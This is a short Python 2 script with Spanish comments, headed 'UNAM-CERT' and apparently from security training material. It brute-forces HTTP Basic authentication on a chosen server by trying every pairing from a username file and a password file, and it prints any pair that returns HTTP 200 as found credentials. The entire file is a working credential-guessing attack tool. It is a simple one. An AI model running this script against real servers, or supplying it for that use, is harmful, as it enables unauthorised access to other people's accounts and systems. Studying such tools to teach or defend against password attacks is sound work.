#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT

#Para ejecutar
#python req.py -s servidor -U archivo_usuarios -P archivo_password
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='arch_user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='arch_pass', default=None, help='Password that will be tested during the attack.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password):
    try:
        response = get(host, auth=(user,password))
        #print response
        #print dir(response)
        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
        else:
            print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        with open(opts.arch_pass) as passw, open(opts.arch_user) as user:
            pwd = passw.readlines()
            users = user.readlines()
        for us in users:
            for pas in pwd:
                # print(us[:-1],pas[:-1])
                makeRequest(url, us[:-1], pas[:-1])
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
